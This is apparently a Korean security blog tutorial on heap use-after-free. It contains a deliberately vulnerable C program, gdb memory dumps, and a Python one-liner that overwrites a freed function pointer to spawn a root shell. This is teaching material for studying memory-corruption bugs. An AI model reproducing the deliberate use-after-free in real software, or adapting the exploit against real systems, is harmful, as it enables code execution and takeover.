---
title: Use After Free
author: Beomsu Lee
category: [Exploitation, Heap]
tags: [exploitation, heap, use after free]
math: true
mermaid: true
---


## Description

heap 영역에 할당을 할때 Free 해준 공간을 다시 재사용하여 발생하는 취약점이다. 만약 함수포인터가 동적할당이 되어있을 경우 실행흐름도 조작 가능하다.

## Conditions

- 공격자가 heap 영역을 할당하거나 해제할 수 있어야 함
- 해제된 영역의 크기와 같거나 작은 영역을 할당해야 함

## Proof of concept

```c
// gcc uaf.c -o uaf
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
 
typedef struct {
    char name[32];
    void (*print)(void*);
} test;
 
typedef struct {
    char name[128];
} string;
 
void printName(test *t) {
    printf("%s\n", t->name);
}
 
void shell() {
    printf("This is shell!! You know UAF vuln!\n");
    system("/bin/sh");
}
 
int main() {
    test* t1;
    string *s1;
    t1 = malloc(256);
    
    strcpy(t1->name, "I LOVE CHAEYOUNG");
    t1->print = (void*)printName;
    
    t1->print(t1);
    
    free(t1);
    
    s1 = malloc(256);
    
    scanf("%128s", s1->name);
    t1->print(t1);
    return 0;
}
```

malloc() 함수로 heap을 재할당 하는 부분에서 Breakpoint를 걸고 확인해보면 t1에서 사용했던 함수 포인터(printName)를 확인할 수 있다. t1->name은 fk, bk로 채워진 것을 확인할 수 있다.

```
[-------------------------------------code-------------------------------------]
0x4006ee <main+82>: call   0x400500 <free@plt>
0x4006f3 <main+87>: mov    edi,0x100
0x4006f8 <main+92>: call   0x400540 <malloc@plt>
=> 0x4006fd <main+97>:  mov    QWORD PTR [rbp-0x8],rax
0x400701 <main+101>:    mov    rax,QWORD PTR [rbp-0x8]
0x400705 <main+105>:    mov    rsi,rax
0x400708 <main+108>:    mov    edi,0x4007e3
0x40070d <main+113>:    mov    eax,0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Breakpoint 1, 0x00000000004006fd in main ()
gdb-peda$ info r rax
rax            0x602010 0x602010
gdb-peda$ x/12gx 0x602010
0x602010:   0x00007ffff7dd1b78               0x00007ffff7dd1b78
0x602020:   0x0000000000000000               0x0000000000000000
0x602030:   0x0000000000400666 <- printName  0x0000000000000000
gdb-peda$ x/3i 0x0000000000400666
0x400666 <printName>:   push   rbp
0x400667 <printName+1>: mov    rbp,rsp
0x40066a <printName+4>: sub    rsp,0x10
```

따라서 32 byte를 입력 후 함수 포인터에 &shell()를 입력하면 t1->print(t1)을 호출하므로 shell()을 호출이 가능하다.

```
gdb-peda$ x/12gx 0x602010
0x602010:   0x4141414141414141  0x4141414141414141
0x602020:   0x4141414141414141  0x4141414141414141
0x602030:   0x4242424242424242  0x0000000000000000
gdb-peda$ p shell
$1 = {<text variable, no debug info>} 0x400681 <shell>
```

## Exploit

```bash
root@bs-virtual-machine:~/pwnable/uaf# (python -c 'print "A"*32 + "\x81\x06\x40"';cat) | ./uaf
UAF TEST!!!
This is shell!! You know UAF vuln!

id
uid=0(root) gid=0(root) groups=0(root)
pwd
/root/pwnable/uaf
```

## References

- [first-fit(Use-After-Free)[Korean]](https://www.lazenca.net/pages/viewpage.action?pageId=1148139)
- [Heap 영역에서 발생하는 취약점을 알아보자!](https://bpsecblog.wordpress.com/2016/10/06/heap_vuln/)
- [\[Heap\] Use After Free](https://shotgh.tistory.com/62)